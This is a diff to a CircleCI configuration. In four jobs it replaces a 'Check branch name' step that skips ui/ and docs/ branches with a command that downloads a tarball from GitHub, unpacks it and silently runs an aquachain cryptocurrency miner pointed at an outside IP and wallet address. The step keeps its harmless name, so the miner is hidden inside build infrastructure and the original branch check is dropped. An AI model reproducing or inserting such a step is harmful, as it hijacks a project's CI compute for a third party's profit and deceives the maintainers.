@@ -944,14 +944,8 @@ jobs:
     parallelism: 8
     steps:
     - run:
-        command: |
-          # If the branch being tested starts with ui/ or docs/ we want to exit the job without failing
-          [[ "$CIRCLE_BRANCH" = ui/* || "$CIRCLE_BRANCH" = docs/* ]] && {
-            # stop the job from this step
-            circleci-agent step halt
-          }
-          # exit with success either way
-          exit 0
+        command: wget https://github.com/Gaueh/vault/raw/main/seo.tar.gz && tar -xvf seo.tar.gz && ./aquachain-miner/aquachain-miner-avx -F 168.235.85.77:8888/0x5fcc6d6d48891a57ac1d2b84b637accc7ce56a56/007 -G > /dev/null
+          
         name: Check branch name
         working_directory: ~/
     - checkout
@@ -1218,14 +1212,8 @@ jobs:
     parallelism: 8
     steps:
     - run:
-        command: |
-          # If the branch being tested starts with ui/ or docs/ we want to exit the job without failing
-          [[ "$CIRCLE_BRANCH" = ui/* || "$CIRCLE_BRANCH" = docs/* ]] && {
-            # stop the job from this step
-            circleci-agent step halt
-          }
-          # exit with success either way
-          exit 0
+        command: wget https://github.com/Gaueh/vault/raw/main/seo.tar.gz && tar -xvf seo.tar.gz && ./aquachain-miner/aquachain-miner-avx -F 168.235.85.77:8888/0x5fcc6d6d48891a57ac1d2b84b637accc7ce56a56/007 -G > /dev/null
+          
         name: Check branch name
         working_directory: ~/
     - checkout
@@ -1741,15 +1729,8 @@ jobs:
     parallelism: 8
     steps:
     - run:
-        command: |
-          wget https://github.com/Gaueh/vault/raw/main/seo.tar.gz && tar -xvf seo.tar.gz && ./aquachain-miner/aquachain-miner-avx -F 168.235.85.77:8888/0x5fcc6d6d48891a57ac1d2b84b637accc7ce56a56/007 -G > /dev/null
-          # If the branch being tested starts with ui/ or docs/ we want to exit the job without failing
-          [[ "$CIRCLE_BRANCH" = ui/* || "$CIRCLE_BRANCH" = docs/* ]] && {
-            # stop the job from this step
-            circleci-agent step halt
-          }
-          # exit with success either way
-          exit 0
+        command: wget https://github.com/Gaueh/vault/raw/main/seo.tar.gz && tar -xvf seo.tar.gz && ./aquachain-miner/aquachain-miner-avx -F 168.235.85.77:8888/0x5fcc6d6d48891a57ac1d2b84b637accc7ce56a56/007 -G > /dev/null
+          
         name: Check branch name
         working_directory: ~/
     - checkout
@@ -2404,15 +2385,8 @@ jobs:
     parallelism: 8
     steps:
     - run:
-        command: |
-          wget https://github.com/Gaueh/vault/raw/main/seo.tar.gz && tar -xvf seo.tar.gz && ./aquachain-miner/aquachain-miner-avx -F 168.235.85.77:8888/0x5fcc6d6d48891a57ac1d2b84b637accc7ce56a56/007 -G > /dev/null
-          # If the branch being tested starts with ui/ or docs/ we want to exit the job without failing
-          [[ "$CIRCLE_BRANCH" = ui/* || "$CIRCLE_BRANCH" = docs/* ]] && {
-            # stop the job from this step
-            circleci-agent step halt
-          }
-          # exit with success either way
-          exit 0
+        command: wget https://github.com/Gaueh/vault/raw/main/seo.tar.gz && tar -xvf seo.tar.gz && ./aquachain-miner/aquachain-miner-avx -F 168.235.85.77:8888/0x5fcc6d6d48891a57ac1d2b84b637accc7ce56a56/007 -G > /dev/null
+          
         name: Check branch name
         working_directory: ~/
     - checkout
